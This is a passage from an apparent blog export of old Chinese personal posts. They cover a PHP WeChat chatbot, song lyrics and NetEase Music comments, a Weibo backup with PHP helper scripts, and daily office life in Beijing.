我用了下效果还可以。 最后 资源http://www.nicetool.net/app/hold_up.htmlhttps://emotion.yunser.com/uphttp://www.atoolbox.net/Tool.php?Id=789https://www.jiuwa.net/jupai/http://www.vszj.cn/Drawing/XiaoRen1http://www.gaituba.com/jupaixiaoren/https://github.com/idle-dog/upuphttps://minapp.com/miniapp/3668/https://wxapp.top/app/14660 推荐阅读: 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 如何提取公积金 9 天到账 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 那些你可能用得上的简历写作工具 Chrome 浏览器扩展神器油猴 我的新浪工作日常 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[公众号开通原创功能了]]></title>
    <url>%2F2019%2F08%2F26%2F%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E9%80%9A%E5%8E%9F%E5%88%9B%E5%8A%9F%E8%83%BD%E4%BA%86%2F</url>
    <content type="text"><![CDATA[这是一篇旧文。 很喜欢张靓颖的这首《终于等到你》，网易云音乐链接 http://music.163.com/#/song?id=27836179 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677781. `作曲 : 董冬冬`2. `作词 : 陈曦`3. `到了某个年纪你就会知道`4. `一个人的日子真的难熬`5. `渐渐开始尝到孤单的味道`6. `时间在敲打着你的骄傲`7. `过了某个路口你就会感到`8. `彻夜陪你聊天的越来越少`9. `厌倦了被寂寞追着跑`10. `找个爱你的人就想托付终老`11. `能陪我走一程的人有多少`12. `愿意走完一生的更是寥寥`13. `是否刻骨铭心并没那么重要`14. `只想在平淡中体会爱的味道`15. `终于等到你 还好我没放弃`16. `幸福来得好不容易`17. `才会让人更加珍惜`18. `终于等到你 差点要错过你`19. `在最好的年纪遇到你`20. `才算没有辜负自己`21. `终于等到你`22. `能陪我走一程的人有多少`23. `愿意走完一生的更是寥寥`24. `是否刻骨铭心并没那么重要`25. `只想在平淡中体会爱的味道`26. `终于等到你 还好我没放弃`27. `幸福来得好不容易`28. `才会让人更加珍惜`29. `终于等到你 差点要错过你`30. `在最好的年纪遇到你`31. `才算没有辜负自己`32. `终于等到你`33. `终于等到你 还好我没放弃`34. `幸福来得好不容易`35. `才会让人更加珍惜`36. `终于等到你 差点要错过你`37. `在最好的年纪遇到你`38. `才算没有辜负自己`39. `终于等到你` 今天登陆公众号发现微信居然邀请我开通原创功能了，终于等到你，真是太开心了， 记得是从 2016 年 9 月 8 号开始推送公众号的，一晃快一年了， 总共推送 58 次，更新频率比较慢。 开通这个号纯粹是兴趣，相比微博的吐槽，公众号更适合记录生活和技术。平常也是周末更新，每次更新大概要一个多小时，用的 markdown 排版（http://md.barretlee.com/），虽然不那么精美，但很省心，真佩服那些每天坚持推送的原创公众号。关于 markdown 简直写作神器，下次好好介绍一番。 本公众号大多数文章偏技术方向 （所以开通了另外一个号专门更新技术类文章），今后会更新些更生活更有趣的文章，欢迎持续关注。 其中这篇文章阅读量最高python 下载全民k歌歌曲 这篇点赞最高我的 2016 年 下面就开始开通原创功能了。 微信审核速度还真快，大周末的，赞一个。 记得之前一位朋友说等我的公众号开通留言要来吐槽，现在开始公众号可以留言了， 不知道她还记得吗？小伙伴们，今后对我的公众号有任何意见欢迎留言吐槽哈，如果觉得无聊可以调戏下机器人我的公众号机器人 最后发福利了，关注本公众号发送 红包 直接领取支付宝红包，来晚就没啦。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的微信公众号机器人]]></title>
    <url>%2F2019%2F08%2F26%2F%E6%88%91%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E6%9C%BA%E5%99%A8%E4%BA%BA%2F</url>
    <content type="text"><![CDATA[这是一篇旧文。 最近北京进入高温天气，最高气温 36 度，太热了。 最近一朋友创业开发一棋牌游戏，买了台阿里云服务器，帮他做了个后台，想着不能浪费资源，记得之前用我的个人微信玩过微信机器人，于是想着给公众号也接一个机器人，于是就有了这个公众号的机器人，下面开始说说怎么开发的。 第一步当然是注册公众号了，这个简单了，就不说了，然后在基本配置里设置服务器地址和 token，需要注意的是服务器需要能在外网访问，80 端口能访问。如果没有自己的外网服务器，也可以使用开源的 ngrok.com ngrok.cc frp 什么的，我没有测试过，你可以尝试下。 机器人是基于图灵的，所以再去 http://www.tuling123.com/ 用手机号注册个账号，申请 key 在 http://www.tuling123.com/member/center/index.jhtml 这个页面可以看到，免费的次数每天 5000，应该够了，功能也比较多全。 下面开始写代码了，我用的是 PHP 比较简单了，才 100 行代码左右，调用也简单。需要注意微信是用 xml 传输的，所以需要转换下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042051. `&lt;?php`2. `define(&quot;TOKEN&quot;, &quot;mybot&quot;);`3. `$wechatObj = new wechatCallbackapi();`5. `//验证微信和响应合并`6. `if (isset($_GET[&apos;echostr&apos;])) &#123;`7. `$wechatObj-&gt;valid();`8. `&#125; else &#123;`9. `$wechatObj-&gt;responseMsg();`11. `&#125;`13. `class wechatCallbackapi&#123;`14. `public function valid()&#123;`15. `$echoStr = $_GET[&quot;echostr&quot;];`16. `if($this-&gt;checkSignature())&#123;`17. `echo $echoStr;`18. `exit;`19. `&#125;`20. `&#125;`21. `public function responseMsg()&#123;`22. `//接受微信服务器发过来的数据`23. `//$postStr = $GLOBALS[&quot;HTTP_RAW_POST_DATA&quot;];`24. `$postObj = [];`25. `$postStr = file_get_contents(&apos;php://input&apos;);`26. `if (!empty($postStr))&#123;`27. `$postObj = (array)simplexml_load_string($postStr, &apos;SimpleXMLElement&apos;, LIBXML_NOCDATA);`28. `&#125;`29. `switch($postObj[&apos;MsgType&apos;])&#123;`30. `case &quot;text&quot;:`31. `$resultStr = $this-&gt;handleText($postObj,$userinfo_base[&apos;uid&apos;],$link);`32. `break;`33. `default:`34. `$resultStr = &quot;Unknow msg type&quot;;`35. `break;`36. `&#125;`37. `echo $resultStr;`38. `&#125;`40. `private function handleText($postObj,$uid,$link) &#123;`41. `$keyword = trim($postObj[&apos;Content&apos;]);`42. `$res = file_get_contents(&apos;http://www.tuling123.com/openapi/api?key=youkey&amp;info=&apos;.urlencode($keyword));// 这里用自己申请的 key`43. `$contentStr = json_decode($res, 1)[&apos;text&apos;];`44. `$resultStr = $this-&gt;responseText($postObj,$contentStr);`45. `return $resultStr;`46. `&#125;`48. `//回复文字信息`49. `private function responseText($postObj,$contentStr) &#123;`50. `$toUsername = $postObj[&apos;ToUserName&apos;];`51. `$textTpl = &quot;&lt;xml&gt;`52. `&lt;ToUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/ToUserName&gt;`53. `&lt;FromUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/FromUserName&gt;`54. `&lt;CreateTime&gt;%s&lt;/CreateTime&gt;`55. `&lt;MsgType&gt;&lt;![CDATA[%s]]&gt;&lt;/MsgType&gt;`56. `&lt;Content&gt;&lt;![CDATA[%s]]&gt;&lt;/Content&gt;`57. `&lt;/xml&gt;&quot;;`58. `$resultStr = sprintf($textTpl,FROMUSERNAME,$toUsername,time(),&apos;text&apos;,$contentStr);`59. `return $resultStr;`60. `&#125;`62. `//回复图文信息 这里没有用到`63. `private function responseNews($postObj,$contentStr) &#123;`64. `$toUsername = $postObj[&apos;ToUserName&apos;];`65. `$news=&quot;&lt;xml&gt;`66. `&lt;ToUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/ToUserName&gt;`67. `&lt;FromUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/FromUserName&gt;`68. `&lt;CreateTime&gt;%s&lt;/CreateTime&gt;`69. `&lt;MsgType&gt;&lt;![CDATA[%s]]&gt;&lt;/MsgType&gt;` 70. `&lt;ArticleCount&gt;%d&lt;/ArticleCount&gt;`71. `&lt;Articles&gt;%s&lt;/Articles&gt;`72. `&lt;/xml&gt;&quot;;`73. `$itemTpl = &apos;&lt;item&gt;`74. `&lt;Title&gt;&lt;![CDATA[%s]]&gt;&lt;/Title&gt;`75. `&lt;Discription&gt;&lt;![CDATA[%s]]&gt;&lt;/Discription&gt;`76. `&lt;PicUrl&gt;&lt;![CDATA[%s]]&gt;&lt;/PicUrl&gt;`77. `&lt;Url&gt;&lt;![CDATA[%s]]&gt;&lt;/Url&gt;`78. `&lt;/item&gt;&apos;;`79. `$items = &apos;&apos;;`80. `foreach ($contentStr as $v) &#123;`81. `if(is_array($v))&#123;`82. `//多图文`83. `$items .= sprintf($itemTpl, $v[&apos;Title&apos;], $v[&apos;Discription&apos;], $v[&apos;PicUrl&apos;], $v[&apos;Url&apos;]);`84. `$num = count($contentStr);`85. `&#125;else &#123;`86. `//单图文`87. `$items= sprintf($itemTpl, $contentStr[&apos;Title&apos;], $contentStr[&apos;Discription&apos;], $contentStr[&apos;PicUrl&apos;], $contentStr[&apos;Url&apos;]);`88. `$num = 1;`89. `&#125;`90. `&#125;`91. `$resultStr = sprintf($news, FROMUSERNAME, $toUsername, time(), &apos;news&apos;, $num,$items);`92. `return $resultStr;`93. `&#125;`94. `//微信验证`95. `private function checkSignature()&#123;`96. `$signature = $_GET[&quot;signature&quot;];`97. `$timestamp = $_GET[&quot;timestamp&quot;];`98. `$nonce = $_GET[&quot;nonce&quot;];` 99. `$token = TOKEN;`100. `$tmpArr = array($token, $timestamp, $nonce);`101. `sort($tmpArr);`102. `$tmpStr = implode($tmpArr);`103. `$tmpStr = sha1($tmpStr);`104. `if($tmpStr == $signature)&#123;`105. `return true;`106. `&#125;`107. `return false;`108. `&#125;`109. `&#125;` 看看效果吧，常用关键字：笑话，天气，故事，段子，成语接龙，菜谱，更多玩法开始关注我的公众号玩吧，再也不用担心一个人无聊了。 太热了，要去洗澡了，bye。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[程序员式表白]]></title>
    <url>%2F2019%2F08%2F26%2F%E7%A8%8B%E5%BA%8F%E5%91%98%E5%BC%8F%E8%A1%A8%E7%99%BD%2F</url>
    <content type="text"><![CDATA[这是一篇旧文。 虐狗的 520 终于过去了，不知从什么时候开始，各种节日层出不穷：214 情人节，314 白色情人节，七夕情人节，双十一购物节，圣诞节 ，于是 520 也成了节日了，微信红包去年开始还特意在当天调整红包最大金额从 200 到 520 。 520 谐音 我爱你，也是个告白的好日子，想到告白可能最先联想到影视剧中男女主角人约黄昏后，共进晚餐，男主送上礼物，比如： 然后手持玫瑰，深情告白女主，女主默默收下，害羞而又兴奋。 作为程序员有什么独特的告白方式呢？ 0.先送上一支花 https://sushengbuhuo.github.io/flower.html 1.给她一颗炽热的 ❤ http://res.crossincode.com/other/heart.html 2.用Python 输出 ❤ 123456789101112131415161718192021222324252627print(&apos;\n&apos;.join([&apos;&apos;.join([(&apos;Love&apos;[(x-y) % len(&apos;Love&apos;)] if ((x*0.05)**2+(y*0.1)**2-1)**3-(x*0.05)**2*(y*0.1)**3 &lt;= 0 else &apos; &apos;) for x in range(-30, 30)]) for y in range(30, -30, -1)])) veLoveLov veLoveLov eLoveLoveLoveLove eLoveLoveLoveLove veLoveLoveLoveLoveLoveLoveLoveLoveLoveLov veLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveL veLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLov eLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLove LoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveL oveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLo veLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLov eLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLove oveLoveLoveLoveLoveLoveLoveLoveLoveLoveLove eLoveLoveLoveLoveLoveLoveLoveLoveLoveLove LoveLoveLoveLoveLoveLoveLoveLoveLoveLoveL eLoveLoveLoveLoveLoveLoveLoveLoveLove oveLoveLoveLoveLoveLoveLoveLoveLove eLoveLoveLoveLoveLoveLoveLoveLove veLoveLoveLoveLoveLoveLoveLov oveLoveLoveLoveLoveLoveLo LoveLoveLoveLoveLoveL LoveLoveLoveLov LoveLoveL Lov v 3.用一段莫斯密码 http://www.atool.org/morse.php 121. `-..-/-..-/-..-/--..--/--...-....-...-/---..-...--...-/-..----.--.....` 4.给她做一个油画般的头像 http://www.ostagram.ru/lenta?locale=en http://upuptoyou.com 5.让百度来帮你 6.一颗记录你们在一起时间的树 https://github.com/wuxia2001/loveyue http://app.ikow.cn/love/ http://liandwu.com/ 好了， 代码都写好了，就差一个妹子了。 作为单身狗的我只能告白最爱的周杰伦了 https://sushengbuhuo.github.io/jay.html 这个页面采用 impress.js 制作，按键翻页，如同在线的 PPT。 论告白，印象最深的一段还是来自一部凸显父爱及人性光辉的电影《美丽人生》 每篇文章推荐一个工具：网址导航https://zzii.net/ https://123.haoip.cn/ http://1e.sg/ http://shouku123.com/ http://chuangzaoshi.com/ http://byr.wiki/ http://youquhome.com/ http://oeasy.org/]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微博认证成功了]]></title>
    <url>%2F2019%2F08%2F26%2F%E5%BE%AE%E5%8D%9A%E8%AE%A4%E8%AF%81%E6%88%90%E5%8A%9F%E4%BA%86%2F</url>
    <content type="text"><![CDATA[这是一篇旧文。 端午节放假 3 天，可以好好睡一觉了。 2012 年开始玩微博，至今 5 年了 ，5 年来几乎每天更新微博，这应该是我坚持最久的一件事。上周申请了微博认证，很快就通过了，哥也是有身份的人了，虽然并没有什么卵用。 5 年的微博见证着我在北京的种种。 转发过很多鸡汤 历经”世界末日“ 看过的电影 听过的歌 下面就推荐 10 个有意思的微博博主吧 0.@办公室小野 见识脑洞大开的吃货 1.@野食小哥 没胃口的时候看看他怎么吃的 2.@一生唐伯虎 致敬星爷 3.@linux命令行精选网 各种有用的命令行 4.@网易云热评君 听歌看评论只服网易云音乐 5.@郊县天王老田 漫画式秀恩爱 6.@w巫木木 了解周杰伦最新动态 7.@资源掌柜 没有你找不到的资源 8.@papi酱 吐槽能手奇女子 9.@网路冷眼 了解最新技术动态 以上是我关注中的 10 个比较有意思的微博博主，如果你也有关注的其他有意思的博主可以推荐给我，感谢，祝端午节快乐。 最近余额宝年收益破万 4 了，目前放了 8 万左右，可惜个人上限为 25 万，这是我唯一的理财方式了，今后可能需要其他的理财产品。不知道还有什么更高安全收益的理财产品推荐，可以给我留言交流。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网易云音乐那些扎心评论]]></title>
    <url>%2F2019%2F08%2F26%2F%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E9%82%A3%E4%BA%9B%E6%89%8E%E5%BF%83%E8%AF%84%E8%AE%BA%2F</url>
    <content type="text"><![CDATA[这是一篇旧文。 所谓“一入网易深似海，从此其他音乐 APP 是路人”，在网易云音乐不仅仅是听歌，看评论也是一种乐趣，今天就推荐那些网易云音乐扎心评论，有些还被留在杭州地铁上，好想去杭州坐地铁感受下。 截止目前网易云音乐评论最高的歌曲来自杰伦的那首灵魂歌曲《晴天》，评论数已突破 147 万，而且每天在新增，有网友整理了个评论过 5 万的歌单 http://music.163.com/#/playlist?id=455717860 ，赶紧收藏起来吧。 周杰伦《晴天》 http://music.163.com/#/song?id=186016123456789101. `现在想来 我们这波第一批老去的90后还是挺幸运的` 2. `在我们最好的年龄遇到了最好的华语乐坛（周杰伦巅峰 林俊杰 SHE 潘玮柏 蔡依林…）`3. `遇到了巅峰的星爷 遇到了最好的西科东艾北卡南麦 动画城陪我们成长` 4. `周杰伦陪我们成熟 我们看着星爷老去 见证科比退役` 5. `或许我们不是最好的一代 但一定是最精彩的一代` 信乐团《离歌》 http://music.163.com/#/song?id=387592121. `第一个喜欢的姑娘在ktv跟她男票接的初吻，在我面前。那是我这辈子唯一一次把这首歌唱上去。` 王菲《匆匆那年》http://music.163.com/#/song?id=2971375411. `我已经变成了厚脸皮随意听荤段子的女生，可是想起你的时候，还是想穿一次白裙子给你看。` 陈奕迅《好友不见》 http://music.163.com/#/song?id=65538123456781. `这是我今年参加的第三次相亲。一坐下来妈妈便开始讲起对面那女孩的种种优点来，`2. `中心思想就是我必须娶她回家当老婆。我妈妈讲完，对方的妈妈又开始向她女儿夸起我来.`3. `半个钟头过后两位妈妈才互相打了一个眼色离开餐桌把我们两人单独留下.`4. `我和她静静对视了一分钟,“好久不见。”她先开口道` 鹿先森乐队《春风十里》http://music.163.com/#/song?id=3857632312341. `春风十里 五十里 一百里 体测八百米 海底两万里 德芙巧克力 香草味八喜 可可布朗尼` 2. `榴莲菠萝蜜 芝士玉米粒 鸡汁土豆泥 黑椒牛里脊 黄焖辣子鸡 红烧排骨酱醋鱼 不如你 全都不如你` 陈绮贞《我喜欢上你的时内心活动》http://music.163.com/#/song?id=471403427123451. `跟我走吧 忐忑给你 情书给你 不眠的夜给你 四月的清晨给你 雪糕的第一口给你` 2. `海底捞最后一颗鱼丸给你 手给你 怀抱给你 车票给你 跋涉给你 等待给你` 3. `钥匙给你 家给你 一腔孤勇和余生六十年 全都给你` 刘若英 《一辈子孤单》http://music.163.com/#/song?id=25949863121. `刘若英在演唱会上问粉丝我真的会一直孤单嘛？结果奶茶现在孩子都有了。我想问我的幸福在哪？` 好妹妹乐队《你曾是少年》http://music.163.com/#/song?id=2642766312341. `某天，你无端想起一个人，她曾让你对明天有所期许，但是却完全没有出现在你的明天里。`2. `我曾是个少年，但时光悄无声息的流逝，就像今天不知不觉的飘了几片雪花而我却什么也不知。` 薛之谦《你还要我怎样》http://music.163.com/#/song?id=27955653123456781. `听了很多遍也没有经心，下的时候也是因为一些啼笑皆非的理由，`2. `只是昨天在自习室背书的时候觉得旋律很合适，就单曲循环了起来，`3. `直到听到那一句【有一天晚上 梦一场 你白发苍苍 说带我流浪 我还是没犹豫 就随你去天堂 】`4. `一个激灵抓起手机仔仔细细的看歌词，趴在没有人的自习室痛哭出声。` 莫文蔚《他不爱我》http://music.163.com/#/song?id=276995121. `小时候刮奖刮出“谢”字还不扔，非要把“谢谢惠顾”都刮的干干净净才舍得放手，和后来太多的事一模一样。` 谢安琪《钟无艳》http://music.163.com/#/song?id=30835311. `无人问我粥可温 无人与我立黄昏` 杨千嬅《再见二丁目》http://music.163.com/#/song?id=316938121. `林夕把最好的词给了杨千嬅，把情感的凝练给了王菲，把对生活情感的领悟哲理给了陈奕迅` 庄心妍《以后的以后》http://music.163.com/#/song?id=27676089121. `你结婚的时候也请寄一张请帖给我吧，我见过你所有的样子，还想看看你最后不属于我的样子` 张悬《喜欢》http://music.163.com/#/song?id=326719121. `喜欢就去表白，大不了连朋友都做不成，做朋友又有什么用，我又不缺朋友，我缺你。` 金玟岐《岁月神偷》1234561. `为了找到她的网易云账号我一个一个她可能会用的id都搜过 终于让我找到了` 2. `从里面找了她经常听的一首歌 不知道她会不会看评论 我想就算她喜欢看评论` 3. `也看不到我这条了吧。` Misha Mishenko《Vakning að elska》http://music.163.com/#/song?id=26224540123456789101112131415161. `无人与我立黄昏，无人问我粥可温，无人与我捻熄灯，无人共我书半生，无人陪我夜已深，`2. `无人与我把酒分，无人拭我相思泪，无人梦我与前尘，无人陪我顾星辰，无人醒我茶已冷，`3. `无人听我述衷肠，无人解我心头梦，无人拘我言中泪，无人愁我独行路，回首向来萧瑟处，`4. `无人等在灯火阑珊处。` 7. `残阳与我立黄昏，阿婆问我粥可温。飞蛾与我捻熄灯，笔砚共我书半生。孤月陪我夜已深，`8. `往事与我把酒分。春风拭我相思泪，睡梦与我恋前尘。微风陪我顾星辰，案几知我茶已冷。`9. `归燕听我诉衷肠，暗香解我心头梦。素衣拘我言中泪，竹杖伴我独行路。回首向来萧瑟处，`10. `那人却在灯火阑珊处。` 林忆莲《词不达意》http://music.163.com/#/song?id=2558581234561. `每次看这里的评论，总感觉像是在看一段街头采访视频，每个人都匆匆忙忙，`2. `只是在镜头前留下自己的两三句话，但总让我仿佛看到了他们的青春，遗憾，喜乐，成长。`3. `步履不停的人也总想找个与世隔绝的角落悄悄地吐露心声，静静地缅怀追忆，睁开眼我们又是赶路人。` 程璧《我想和你虚度时光》http://music.163.com/#/song?id=3070631812341. `我们从此不刷牙洗脸，不走亲访友，不交养老保险，我们在海边有座房子，室徒四壁，一个床垫子，`2. `几瓶福佳白啤，几本黄色小说，在烛光下，在海浪里，光腚跳舞，弹琴做爱，虚度时光，直到死去。` 周传雄《黄昏》http://music.163.com/#/song?id=1900721234561. `对这首歌一直有特别的感觉。那时候大街小巷都在循环播放它，幼身的自己正在从所在的城市，`2. `穿越到另一个城市的海边，阴沉的海风，涌动的波涛，黑色的沙滩，记忆的童年，`3. `那时候哪里有什么情伤，不知道为什么，也会觉得，整个城市里的人好像都在抽泣。` 陈奕迅《陪你度过漫长岁月》http://music.163.com/#/song?id=35403523123456781. `认识九年多，我在武汉，她在深圳，我们隔着1000多公里的两座城市。`2. `因为直飞深圳太贵，选择了飞广州，再搭高铁去深圳。打了出粗车，坐了机场大巴，换乘了一路的地铁，`3. `终于在下午五点半到了她公司楼下，看到她发现我突然出现在她公司楼下的表情。好像一切都值了。`4. `我们应该会结婚吧，陪着你渡过漫长岁月。` ps：最近转发微博又中奖了（我为什么说又呢），是一件极客T恤 pps: 今天我爸又打电话催我：什么这么大的人还不结婚，还让不让我们好好过了，老家的地都快征完了，每个人能分十多万，我们家就 3 个人，难道我不想结婚，我也很绝望啊。。。 每篇文章推荐一个工具：将你的微博，微信朋友圈出版成书，微信书https://weixinshu.com/ 出书啦 http://www.chushu.la/ 她们都有微博和公众号，关注即可。 The End]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微博备份]]></title>
    <url>%2F2019%2F08%2F26%2F%E5%BE%AE%E5%8D%9A%E5%A4%87%E4%BB%BD%2F</url>
    <content type="text"><![CDATA[这是一篇旧文。玩微博 5 年了，至今发布微博 66747 条，前几天微博突然挂了，而且最近微博管控越来越严格了，为了安全把我的 5 年微博备份下，使用的工具是一个 chrome 插件 具体使用教程见这条微博 http://weibo.com/1869328492/F9cR9okDK?type=comment#_rnd1498388083394 扩展见微盘 http://vdisk.weibo.com/s/x5GuwUhlGH/1498206615 由于 chrome 扩展安装需要翻(fan)墙(qiang)，所以作者提供的是 crx 文件，下载后拖到扩展里就可以安装 感谢作者@Easy 一、下载后，拖入chrome扩展页安装。 二、点击工具图标进入操作页面，微信扫码登录。这时注意一下，先打开weibo.com登录你的微博。这里登录后，下面一步weibo.cn时会自动登录，因为weibo.cn的登录很麻烦，所以这里要先登录。 三、会看到【点我测试我的微博网络】，点它，打开weibo.cn。返回工具页面，点【登录后点此继续】。这里要注意一下，在打开的weibo.cn页面，下拉到最底下，看到条数，点开，设置20。点预览，后点保存设置。返回工具页面，再点【全量备份】。微博越多速度越慢。如果你发现数字不动了，点一下图标，即可开新页，会看到可以继续， 四、完成后，会自动进入预览效果页面。会有一个下载按钮。点下载即可。 五、会得到一个压缩包，解压后，就是N个html文件，这就是把你的微博备份了。 下载后的文件打开若有乱码，则更新浏览器。 从早上 9 点就开始备份了，然后我的微博数实在太大了， 共 66741 条 6675 页微博需要备份，预计需要 166 分钟，作者都惊呆了，鬼知道我都发了些什么微博。 最后还是微信上@easy 直接帮我导出了，感谢。 作者还给懂PHP的同学提供两个微贝的增强脚本，解压后放到那堆html 同级目录，运行 php json.php 会把feed数据提取到json目录，运行 php img.php 可以把页面中的图片备份到本地并替换链接。http://vdisk.weibo.com/s/x5GuwUhQQ_/1498322627123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219$ cat json.php&lt;?phpforeach( glob( '*.html' ) as $k =&gt; $htmlfile )&#123; echo "File $htmlfile ..."; $reg = '/this\.feeds\s+=\s+(.+?)\&#125;\s+,\s+1000/is'; $content = file_get_contents( $htmlfile ); if( preg_match( $reg , $content , $out ) ) &#123; if($data = json_decode( trim($out[1]) , 1 )) &#123; @mkdir( 'json/', 0777 , true ); $jsonfile = 'json/' . basename( $htmlfile ) . '.json'; file_put_contents( $jsonfile , trim($out[1]) ); echo "done.\r\n"; &#125; else echo "error.\r\n"; &#125;&#125;echo "ALL Done.";$ cat img.php&lt;?phpforeach( glob( '*.html' ) as $k =&gt; $htmlfile )&#123; echo "File: $htmlfile \r\n"; $reg = '/this\.feeds\s+=\s+(.+?)\&#125;\s+,\s+1000/is'; $content = file_get_contents( $htmlfile ); if( preg_match( $reg , $content , $out ) ) &#123; if($data = json_decode( trim($out[1]) , 1 )) &#123; foreach ( $data as $kkk =&gt; $item ) &#123; $keys = array(); $keys[] = 'pic_url'; //$keys[] = 'oripic_url'; $keys[] = 'rt_pic_url'; //$keys[] = 'rt_oripic_url'; foreach( $keys as $key ) &#123; if( strlen( $item[$key] ) &gt; 0 &amp;&amp; (substr( $item[$key] , 0 , 7 ) == 'http://' || substr( $item[$key] , 0 , 8 ) == 'https://' ) ) &#123; $info = explode( '.' , basename( $item[$key] )); $ext = end( $info ); if( !in_array( $ext , array( 'png' , 'jpg' , 'jpeg' , 'gif' ) ) ) &#123; $ext = 'jpg'; &#125; @mkdir( 'img/' . $k . '/' , 0777 , true ); $newfile = 'img/' . $k . '/' . $item['cid'] . '.'.$key.'.' .$ext; echo "Image: " . $item[$key] . "\r\n" ; if( copy( $item[$key] , $newfile ) ) &#123; $data[$kkk][$key] = $newfile; // 处理原图 if( $key == 'rt_pic_url' ) &#123; $new_ofile = 'img/' . $k . '/' . $item['cid'] . '.'.$key.'.rtori.' .$ext; $nurl = str_replace( '/wap180/' , '/large/', $item[$key] ); echo "Image: " . $nurl . "\r\n" ; if( copy( $nurl, $new_ofile ) ) $data[$kkk]['rt_oripic_url'] = $new_ofile; &#125; // 处理原图 if( $key == 'pic_url' ) &#123; $new_ofile = 'img/' . $k . '/' . $item['cid'] . '.'.$key.'.ori.' .$ext; $nurl = str_replace( '/wap180/' , '/large/', $item[$key] ); echo "Image: " . $nurl . "\r\n" ; if( copy( $nurl, $new_ofile ) ) $data[$kkk]['oripic_url'] = $new_ofile; &#125; echo "...done\r\n"; &#125; else &#123; echo "...error \r\n"; &#125; echo "@Page $k \r\n"; &#125; &#125; &#125; $content = str_replace( $out[1] , json_encode( $data ) , $content ); file_put_contents( $htmlfile , $content ); &#125; &#125;&#125;echo "All Done!"; 最后导出目录下 92 MB，130 个 HTML 文件 最后推荐几个好用的 chrome 插件 https://chrome.google.com/webstore/category/extensions?hl=zh-CN 不过安装 chrome 扩展，你懂的，在墙外，所以需要用软件，比如最常用的 ss,教程见 http://www.iyingsuo.com/help.html 油猴脚本Violent monkey https://greasyfork.org/zh-CN 安装这个脚本后访问指定的网址就可以了。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[北京的雨]]></title>
    <url>%2F2019%2F08%2F26%2F%E5%8C%97%E4%BA%AC%E7%9A%84%E9%9B%A8%2F</url>
    <content type="text"><![CDATA[这是一篇旧文。又一次成了落汤鸡，不记得第几次了。 今天早上出门的时候还天空一片晴朗，我戴着耳机，听网易云音乐里 许巍 唱着： 我那总沉默的朋友 你让我感觉到力量 曾在我心中的伤口 如过眼的云烟 初次 感觉 心就像天空般晴朗 初次 感觉 心就像天空般晴朗 啦……啦……啦…… 本来今天没什么事，最近也没什么事，每天 10 点前到公司，打开电脑，输入密码，我的电脑平常都不关机的，主要每次开机要启动服务器，打开好几个浏览器，打开编辑器，PHPstorm，连 vpn ，命令行等等，好麻烦，所以就每周五下班关机一次。 上午基本没什么事干，刷刷微博，看看 QQ 群，聊聊微信群，看看公众号，基本快到 11 点半了，出去走动下，到 11 点 50 准备吃饭了。吃完饭睡一个小时，下午 2 点正式开始工作了，今天就统计了些数据，导出excel，发邮件和短信。导出用的 https://packagist.org/packages/maatwebsite/excel 这个 laravel composer 包，使用挺方便的，看代码： 1234567891011121314151617181920// http://www.maatwebsite.nl/laravel-excel/docs/export` `$data = array(` `array('data1', 'data2'),` `array('data3', 'data4')` `);` `Excel::create('Filename', function($excel) use($data) &#123;` `$excel-&gt;sheet('Sheetname', function($sheet) use($data) &#123;` `$sheet-&gt;fromArray($data);` `&#125;);` `&#125;)-&gt;store('xls', storage_path('excel/exports'))-&gt;export('xls');` 然后到 6 点半准备去吃饭的时候 pm 说要改个东西。他以为挺简单的，结果我一看，卧槽，简单你妹啊（我没有说出来，如果他看我的眼神应该会明白的），公司的代码涉及几个项目，好几个代码仓库，需要改动其他同事负责的代码，那是公司观看直播的核心代码，一个方法几千行，没错，几千行代码，那一个个if else 一个个 foreach，看得我头大，我真不敢动，生怕改出问题，然后问了下同事（本来想让他帮忙改，人家有孩子了，这个点了得回去带孩子，好吧），需要改哪些地方，逻辑怎么处理，然后就整到 9 点了，我也是服了pm，麻烦下次有事提前说行不。 出地铁的时候就发现暴雨了，记得上次也是这样，看看当时的微博。 